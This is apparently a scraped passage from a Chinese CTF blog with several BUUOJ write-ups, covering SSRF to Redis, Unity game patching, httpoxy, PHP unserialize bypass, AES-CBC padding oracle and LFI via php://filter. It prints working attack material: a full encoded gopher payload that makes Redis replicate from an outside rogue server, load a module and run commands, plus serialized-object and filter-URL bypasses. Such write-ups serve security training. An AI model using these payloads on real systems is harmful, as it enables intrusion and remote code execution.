ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int_ip&gt;&gt;16;&#125;function safe_request_url($url)&#123; if (check_inner_ip($url)) &#123; echo $url.&#x27; is inner ip&#x27;; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info[&#x27;redirect_url&#x27;]) &#123; safe_request_url($result_info[&#x27;redirect_url&#x27;]); &#125; curl_close($ch); var_dump($output); &#125;&#125;if(isset($_GET[&#x27;url&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; if(!empty($url))&#123; safe_request_url($url); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;// Please visit hint.php locally.?&gt; 很明显，SSRF，还涉及parse_url和curl的问题。先看check_inner_ip。协议要http https pogher dict，然后用parse_url得到host，gethostbyname把域名转成IP。然后用ip2long判断IP是否属于127.*.*.* 172.16.*.*-172.32.*.* 192.168.*.*范围，是则认为是内部地址。然而本地要求不能是本地IP，但是hint.php又要求是本地IP访问。 如何绕过？有两种思路：一是利用DNS Rebinding。让域名在check_inner_ip的时候为外部地址，而curl请求的时候又变成内部IP。有平台可以做到，但是会随机变化，要多打几次。二是利用一个特殊IP：0.0.0.0。这个IP在配服务的时候应该见过。在服务端被视为任意IP地址，包括服务自身的地址。因此我们把IP设成0.0.0.0就可以了。 直接访问http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=http://0.0.0.0/hint.php。得到hint.php内容： 123456789&lt;?phpif($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&quot;127.0.0.1&quot;)&#123; highlight_file(__FILE__);&#125;if(isset($_POST[&#x27;file&#x27;]))&#123; file_put_contents($_POST[&#x27;file&#x27;],&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;.$_POST[&#x27;file&#x27;]);&#125; 内网Redis，Gopher协议。对付Redis，一般几种方向：写ssh密钥，写crontab，写Shell，以及最新爆出来的主从复制。先试一下写文件，Gopher的payload有点长，不想手动抓包，直接用工具。发现ssh crontab shell都失败了，只能主从复制了。 这次要用到这个的exp.so和这个。BUU环境下我们还需要一台靶机当Rogue Server。修改ssrf-redis.py，改一下IP地址和命令，配套的rogue-server.py默认监听6666端口，就不改了，然后运行生成payload。注意由于要过curl，需要二次URL编码。 然后访问http://9bcb67ea-7fa8-4be8-857b-2599bad85b16.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/%5f%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%32%25%30%44%25%30%41%31%37%34%2e%32%2e%37%32%2e%31%33%35%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41即可。注意要先访问一遍进行同步，然后才可以执行命令。由于rogue-server.py不等待同步完成就退出，可能造成exp.so没有传完就结束了，所以需要一个死循环反复执行。 https://lock.cmpxchg8b.com/rebinder.html flag{e7cfe6b7-db69-4a88-8889-fa7fc11e538c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Redis","slug":"Redis","permalink":"http://tiaonmmn.github.io/tags/Redis/"},{"name":"SSRF","slug":"SSRF","permalink":"http://tiaonmmn.github.io/tags/SSRF/"}]},{"title":"BUUOJ刷题-Misc-Mine-Sweeping","slug":"BUUOJ刷题-Misc-Mine-Sweeping","date":"2020-06-02T12:11:36.000Z","updated":"2020-06-02T14:01:04.158Z","comments":true,"path":"2020/06/02/BUUOJ刷题-Misc-Mine-Sweeping/","link":"","permalink":"http://tiaonmmn.github.io/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/","excerpt":"","text":"De1CTF 2019的Mine Sweeping，你确定这不是道Reverse? Unity游戏，直接找Data目录下的Managed的DLL文件，发现一个Assembly-CSharp.dll，应该就是核心代码了。 拖到dotPeek里，顺利反编译，然后直接Export to project，VS改代码不香么？ 导出来3个文件，Grid.cs里包含GameWin()和GameLose()方法，而Element.cs里的OnMouseUpAsButton()包含有\"game over:lose\"等关键字符串。 这道题有很多种解法： 1 Patch 研究OnMouseUpAsButton()方法： 12345678910111213141516171819202122232425private void OnMouseUpAsButton()&#123; if (Grids._instance.bGameEnd || this.bIsOpen) return; this.bIsOpen = true; int x = (int)this.transform.position.x; int y = (int)this.transform.position.y; if (this.bIsMine) &#123; this.SafeAndThunder(0); Grids._instance.bGameEnd = true; Grids._instance.GameLose(); MonoBehaviour.print((object)&quot;game over: lose&quot;); &#125; else &#123; this.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y)); Grids._instance.Flush(x, y, new bool[29, 29]); &#125; if (!Grids._instance.GameWin()) return; Grids._instance.bGameEnd = true; MonoBehaviour.print((object)&quot;game over: win&quot;);&#125; 很明显的，如果bIsMine为真，执行GameLose()方法。因此我们注释掉三行，变成这样： 12345678910111213141516171819202122232425private void OnMouseUpAsButton()&#123; if (Grids._instance.bGameEnd || this.bIsOpen) return; this.bIsOpen = true; int x = (int)this.transform.position.x; int y = (int)this.transform.position.y; if (this.bIsMine) &#123; this.SafeAndThunder(0); //Grids._instance.bGameEnd = true; //Grids._instance.GameLose(); //MonoBehaviour.print((object)&quot;game over: lose&quot;); &#125; else &#123; this.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y)); Grids._instance.Flush(x, y, new bool[29, 29]); &#125; if (!Grids._instance.GameWin()) return; Grids._instance.bGameEnd = true; MonoBehaviour.print((object)&quot;game over: win&quot;);&#125; 这样就算踩雷也不会Game Over了。然后我们发现翻了整个代码也没有发现ShowImage之类的调用，那么猜一下这个29*29的方块会不会是某种二维码表现形式。 注意到在判断bIsMine的时候if和else代码块都调用了SafeAndThunder() 1234567public void SafeAndThunder(int adjcent) &#123; if (this.bIsMine) this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Thor; else this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Athene[adjcent]; &#125; 不是很熟Unity，目测是某种模型？我们尝试把if和else调换后编译替换Assembly-CSharp.dll文件，发现数字和雷的图标对调了，证实了我们的猜测。 然后就发现了下面的DawnsLight() 123456&#123; if (this.bIsMine) this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Hodur; else this.GetComponent&lt;SpriteRenderer&gt;().sprite = this.Baldr;&#125; 同样的测试一下，发现Baldr对应白色，Hodur对应黑色。很明显了，二维码。 下面我们要让它显示出来。DawnsLight()函数有一次调用，在Grids.cs里的GameWin() 123456789101112131415161718192021222324public bool GameWin()&#123; Elements[,] eleGrids1 = this.eleGrids; int upperBound1 = eleGrids1.GetUpperBound(0); int upperBound2 = eleGrids1.GetUpperBound(1); for (int lowerBound1 = eleGrids1.GetLowerBound(0); lowerBound1 &lt;= upperBound1; ++lowerBound1) &#123; for (int lowerBound2 = eleGrids1.GetLowerBound(1); lowerBound2 &lt;= upperBound2; ++lowerBound2) &#123; Elements elements = eleGrids1[lowerBound1, lowerBound2]; if (!elements.bIsOpen &amp;&amp; !elements.bIsMine) return false; &#125; &#125; Elements[,] eleGrids2 = this.eleGrids; int upperBound3 = eleGrids2.GetUpperBound(0); int upperBound4 = eleGrids2.GetUpperBound(1); for (int lowerBound1 = eleGrids2.GetLowerBound(0); lowerBound1 &lt;= upperBound3; ++lowerBound1) &#123; for (int lowerBound2 = eleGrids2.GetLowerBound(1); lowerBound2 &lt;= upperBound4; ++lowerBound2) eleGrids2[lowerBound1, lowerBound2].DawnsLight(); &#125; return true;&#125; 我们把那个return false以及上面的if注释掉，DawnsLight()会直接执行。 编译后替换文件执行后，点击就会显示二维码。 扫就行了。 flag{269bc18b-081d-49e7-b0b2-2c0847e6edf8}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"}]},{"title":"BUUOJ刷题-TimeTravel","slug":"BUUOJ刷题-Web-TimeTravel","date":"2020-06-01T01:02:27.000Z","updated":"2020-06-01T01:35:51.951Z","comments":true,"path":"2020/06/01/BUUOJ刷题-Web-TimeTravel/","link":"","permalink":"http://tiaonmmn.github.io/2020/06/01/BUUOJ%E5%88%B7%E9%A2%98-Web-TimeTravel/","excerpt":"","text":"V&amp;N 2020公开赛的TimeTravel。 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);require __DIR__ . &#x27;/vendor/autoload.php&#x27;;use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET[&#x27;flag&#x27;])) &#123; $client = new Client(); $response = $client-&gt;get(&#x27;http://127.0.0.1:5000/api/eligible&#x27;); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data[&#x27;success&#x27;] === true) &#123; echo system(&#x27;/readflag&#x27;); &#125;&#125;if(isset($_GET[&#x27;file&#x27;])) &#123; highlight_file($_GET[&#x27;file&#x27;]);&#125;if(isset($_GET[&#x27;phpinfo&#x27;])) &#123; phpinfo();&#125; 用到了GuzzleHttp，是个HTTP库来着。如果GET传入flag，会访问127.0.0.1:5000/api/eligible，返回的JSON有{\"success\":true}就读flag。GET传入file会任意读文件，GET传入phpinfo返回phpinfo()结果。 显然，直接读flag没可能，不会有那个权限，否则就不会再套层/readflag了。令我们好奇的是，他用了一个GuzzleHttp，显然这个库不是随便找的，一定有问题。 Google搜一下\"guzzlehttp vuln\"，排名第一的就告诉我们问题了，HTTP Request Redirection，又名httpoxy。直接搜就能搜到官网，简单来说，PHP等Web框架在CGI模式下运行时，会将传入的HTTP头当作CGI应用程序的环境变量，而对于PHP来说，它会使用getenv()获取环境变量，在php-fpm等CGI模式下会把HTTP头合并到\\(\\_SERVER数组中。因此，如果我们传入Proxy: 127.0.0.1，在PHP端的\\)_SERVER会导致出现$_SERVER['HTTP_PROXY']赋值为'127.0.0.1'。而一部分的HTTP库会应用HTTP_PROXY变量作为代理，例如GuzzleHttp。也就是说，如果我们在访问页面时加上一个Proxy: 127.0.0.1:8080的HTTP头，GuzzleHttp访问时会把请求代理给127.0.0.1:8080。我们就有机会修改内容了。 不过要注意的是，CGI在传入HTTP头时，会添加HTTP_前缀，如HTTP_HOST。 本题完全符合条件，我们传入Proxy: XXX:YY，就会把对127.0.0.1:5000/api/eligible的请求转发到XXX:YY，我们再修改返回内容即可。 由于是BUUOJ环境，不能用外部服务器，我们用Linux Labs的nc来完成。 先用BurpSuite拦截请求 123456789101112GET /?flag HTTP/1.1Host: node3.buuoj.cn:26215Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 Edg/83.0.478.37Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6DNT: 1Connection: closeProxy: 174.1.23.2:8080 Proxy地址指向Linux Labs的IP，上面用nc监听8080端口。在Linux Labs上修改返回包。 123456789HTTP/1.1 200 OKServer: nginx/1.14.2Date: Mon, 01 Jun 2020 01:30:05 GMTContent-Type: text/html; charset=UTF-8Connection: closeX-Powered-By: PHP/5.6.23Content-Length: 12&#123;&quot;success&quot;:true&#125; 就可以得到flag了。 flag{d00bc26f-ce1d-406b-8742-91079447e475}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"BUUOJ刷题-Web-AreUSerialz","slug":"BUUOJ刷题-Web-AreUSerialz","date":"2020-05-14T12:42:40.000Z","updated":"2020-05-15T12:41:24.087Z","comments":true,"path":"2020/05/14/BUUOJ刷题-Web-AreUSerialz/","link":"","permalink":"http://tiaonmmn.github.io/2020/05/14/BUUOJ%E5%88%B7%E9%A2%98-Web-AreUSerialz/","excerpt":"","text":"2020网鼎杯青龙组的AreUSerialz。 上来给源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 很简单，给了个FileHandler类，然后GET方式传序列化字符串。注意到返回的HTTP头里X-Powered-By为PHP/7.4.3，版本很高。 FileHandler类里有三个protected变量，\\(op决定是读还是写，为1则写文件，2则读文件并输出。但是有个\\_\\_destruct，会把\\)op改为1。那么我们就要想办法绕过__destruct函数。同时，在$_GET传参的时候还有一个is_valid函数，判断传入的字符串是不是都在可见字符范围内。 我们翻PHP的文档，其中提到如果类中变量为private protected属性，会在序列化字符串中添加特殊标识。因此正常序列化的字符串会被is_valid()检测。 后来在某篇文章中看到，PHP7.2以上版本反序列化时无视private protected关键字。那么我们直接用public声明变量就行了。 或者，我们可以用S代替s，参考这里，其中提到为了防止丢失%00字符。我们可以在反序列化字符串中用S插入16进制字符串。正常情况下我们的序列化字符串应为：O:11:\"FileHandler\":3:{s:5:\"�*�op\";i:2;s:11:\"�*�filename\";s:8:\"flag.php\";s:10:\"�*�content\";N;}。其中�为%00。我们可以改写为O:11:\"FileHandler\":3:{S:5:\"\\00*\\00op\";i:2;S:11:\"\\00*\\00filename\";s:8:\"flag.php\";S:10:\"\\00*\\00content\";N;}。这样也可以绕过is_valid()。 最后，这题在BUUOJ上的环境和比赛 环境不一样。BUUOJ上我们可以直接读相对路径下的flag.php。但是比赛环境下我们还需要读/proc/self/cmdline，确认工作目录。 P.S.如果反序列化后类的元素个数与原始类的个数对不上，就会打断执行__destruct()，就像绕过__wakeup()一样。 flag{8eba897c-a688-444f-b0e0-63e9cab136ce}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"}]},{"title":"BUUOJ刷题-Web-WebDog","slug":"BUUOJ刷题-Web-WebDog","date":"2020-04-23T02:22:16.000Z","updated":"2020-08-27T07:13:35.389Z","comments":true,"path":"2020/04/23/BUUOJ刷题-Web-WebDog/","link":"","permalink":"http://tiaonmmn.github.io/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/","excerpt":"","text":"NPUCTF 2020的Web🐕，很基础的AES CBC。 12345678910111213141516171819202122232425262728293031323334353637&lt;?php error_reporting(0);include(&#x27;config.php&#x27;); # $key,$flagdefine(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;); //定义加密方式define(&quot;SECRET_KEY&quot;, $key); //定义密钥define(&quot;IV&quot;,&quot;6666666666666666&quot;); //定义初始向量 16个6define(&quot;BR&quot;,&#x27;&lt;br&gt;&#x27;);if(!isset($_GET[&#x27;source&#x27;]))header(&#x27;location:./index.php?source=1&#x27;);#var_dump($GLOBALS); //听说你想看这个？function aes_encrypt($iv,$data)&#123; echo &quot;--------encrypt---------&quot;.BR; echo &#x27;IV:&#x27;.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;&#125;function aes_decrypt($iv,$data)&#123; return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#x27;False&#x27;);&#125;if($_GET[&#x27;method&#x27;]==&#x27;encrypt&#x27;)&#123; $iv = IV; $data = $flag; echo aes_encrypt($iv,$data);&#125; else if($_GET[&#x27;method&#x27;]==&quot;decrypt&quot;)&#123; $iv = @$_POST[&#x27;iv&#x27;]; $data = @$_POST[&#x27;data&#x27;]; echo aes_decrypt($iv,$data);&#125;echo &quot;我摊牌了，就是懒得写前端&quot;.BR;if($_GET[&#x27;source&#x27;]==1)highlight_file(__FILE__);?&gt; 允许我们加密或解密，加密会把$flag的内容加密显示，而解密时允许我们输入IV和密文，用相同的key解密。那么看起来我们可以直接decrypt了，然后发现并不行。注意到21行解密的时候后面还加了个or，当我们解密成功时or的左端为True，那么会直接返回True，参考这里。所以我们还拿不到明文。 然后发现它用的加密方式是AES CBC，那么就想到AES CBC的两种攻击手法：Padding Oracle和字节反转。Padding Oracle适合在不清楚key和IV的情况下解密密文，这就是我们要的。具体请参考这里。Padding Oracle的条件是能分辨正常解密和解密失败的情况，本题解密失败时会返回False，足够区分了。 flag{0e55ec5f-fdee-4455-96a3-20ebd390da59}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"AES","slug":"AES","permalink":"http://tiaonmmn.github.io/tags/AES/"}]},{"title":"BUUOJ刷题-Web-Eating-CMS","slug":"BUUOJ刷题-Web-Eating-CMS","date":"2020-04-07T02:31:52.000Z","updated":"2020-04-07T08:00:42.570Z","comments":true,"path":"2020/04/07/BUUOJ刷题-Web-Eating-CMS/","link":"","permalink":"http://tiaonmmn.github.io/2020/04/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Eating-CMS/","excerpt":"","text":"N1CTF 2018的Eating_CMS。 打开是个登录页面，登陆的时候会显示SQL语句。猜测有register.php，果然有，注册后登陆，显示新的页面。注意到URL为http://0008abbc-5e70-4d41-b1d7-7d161114c40b.node3.buuoj.cn/user.php?page=guest，试下LFI。user.php?page=/var/www/html/guest，发现可以正常访问，LFI没跑了。试下PHP Filter：user.php?page=php://filter/convert.base64-encode/resource=index，得到index.php的源码，然后扒下来已知文件。 index.php123456789&lt;?phprequire_once &quot;function.php&quot;;if(isset($_SESSION[&#x27;login&#x27;] ))&#123; Header(&quot;Location: user.php?page=info&quot;);&#125;else&#123; include &quot;templates/index.html&quot;;&#125;?&gt; function.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?phpsession_start();require_once &quot;config.php&quot;;function Hacker()&#123; Header(&quot;Location: hacker.php&quot;); die();&#125;function filter_directory()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;; $whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if (strpos(&quot;$whitelist&quot;, $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(&quot;/$blacklist/is&quot;, $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return &quot;&quot;; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = &quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;$user&#x27; and `password_which_you_do_not_know_too` = &#x27;$pass&#x27;&quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION[&#x27;user&#x27;] = $data[username_which_you_do_not_know]; $_SESSION[&#x27;login&#x27;] = 1; $_SESSION[&#x27;isadmin&#x27;] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = &quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;$level&#x27; where `username_which_you_do_not_know`=&#x27;$user&#x27; &quot;; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = &quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;$user&#x27;,&#x27;$pass&#x27;,&#x27;0&#x27;)&quot;; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(&quot;Location: index.php&quot;);&#125;?&gt; user.php12345678910111213141516171819202122232425262728293031323334353637&lt;?phprequire_once(&quot;function.php&quot;);if( !isset( $_SESSION[&#x27;user&#x27;] ))&#123; Header(&quot;Location: index.php&quot;);&#125;if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; $oper_you_can_do = $OPERATE_admin;&#125;else&#123; $oper_you_can_do = $OPERATE;&#125;//die($_SESSION[&#x27;isadmin&#x27;]);if($_SESSION[&#x27;isadmin&#x27;] === &#x27;1&#x27;)&#123; if(!isset($_GET[&#x27;page&#x27;]) || $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;info&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; &#125;&#125;else&#123; if(!isset($_GET[&#x27;page&#x27;])|| $_GET[&#x27;page&#x27;] === &#x27;&#x27;)&#123; $page = &#x27;guest&#x27;; &#125;else &#123; $page = $_GET[&#x27;page&#x27;]; if($page === &#x27;info&#x27;) &#123;// echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;); Header(&quot;Location: user.php?page=guest&quot;); &#125; &#125;&#125;filter_directory();//if(!in_array($page,$oper_you_can_do))&#123;// $page = &#x27;info&#x27;;//&#125;include &quot;$page.php&quot;;?&gt; config.php123456789101112131415161718&lt;?phperror_reporting(E_ERROR | E_WARNING | E_PARSE);define(BASEDIR, &quot;/var/www/html/&quot;);define(FLAG_SIG, 1);$OPERATE = array(&#x27;userinfo&#x27;,&#x27;upload&#x27;,&#x27;search&#x27;);$OPERATE_admin = array(&#x27;userinfo&#x27;,&#x27;upload&#x27;,&#x27;search&#x27;,&#x27;manage&#x27;);$DBHOST = &quot;localhost&quot;;$DBUSER = &quot;root&quot;;$DBPASS = &quot;Nu1LCTF2018!@#qwe&quot;;//$DBPASS = &quot;&quot;;$DBNAME = &quot;N1CTF&quot;;$mysqli = @new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);if(mysqli_connect_errno())&#123; echo &quot;no sql connection&quot;.mysqli_connect_error(); $mysqli=null; die();&#125;?&gt; register.php123456789101112131415161718192021222324&lt;?phprequire_once &quot;function.php&quot;;if($_POST[&#x27;action&#x27;] === &#x27;register&#x27;)&#123; if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123; $user = $_POST[&#x27;username&#x27;]; $pass = $_POST[&#x27;password&#x27;]; $res = register($user,$pass); if($res)&#123; Header(&quot;Location: index.php&quot;); &#125;else&#123; $errmsg = &quot;Username has been registered!&quot;; &#125; &#125; else&#123; Header(&quot;Location: error_parameter.php&quot;); &#125;&#125;if (!$_SESSION[&#x27;login&#x27;]) &#123; include &quot;templates/register.html&quot;;&#125; else &#123; Header(&quot;Location : user.php?page=info&quot;);&#125;?&gt; info.php123456&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly &quot;);&#125;include &quot;templates/info.html&quot;;?&gt; info.php里会include templates/info.html，打开后有个提示ffffllllaaaaggg.php，很明显的直接读源码是行不通的。看一下过滤函数 12345678910111213141516171819function filter_directory_guest()&#123; $keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;]; $uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]); parse_str($uri[&#x27;query&#x27;], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125; parse_url函数解析URL，直接绕过。具体请参考这里，http://d95fe231-c608-4167-98d0-6205f111a1ae.node3.buuoj.cn//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg。得到了ffffllllaaaaggg.php的内容 ffffllllaaaaggg.php1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;else &#123; echo &quot;you can find sth in m4aaannngggeee&quot;;&#125;?&gt; 再读m4aaannngggeee文件。 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(&quot;you can not visit it directly&quot;);&#125;include &quot;templates/upload.html&quot;;?&gt; 访问templates/upload.html后发现处理上传的文件是upllloadddd.php，接着读 